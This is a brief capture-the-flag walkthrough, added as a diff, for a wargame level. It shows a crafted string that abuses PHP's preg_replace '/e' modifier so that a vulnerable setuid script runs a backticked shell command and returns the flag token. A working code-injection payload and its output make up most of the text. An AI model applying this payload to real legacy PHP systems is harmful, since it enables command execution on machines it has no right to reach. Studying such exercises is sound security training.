@@ -1,0 +1,17 @@
+There is a PHP file in the home directory that runs a flag06. It is built on an older version of PHP which is vulnerable to the exploiuts via the preg_replace '/e' option.
+
+We first created a file in /tmp for the PHP app to read:
+
+echo '[x ${`getflag`};]' > /tmp/flag.txt
+
+Then called the PHP app to read the file:
+
+./level06 /tmp/flag.txt
+
+This causes the PHP app to run the back tick and return the flag from flag06:
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+;
+
+There is no password for flag06.
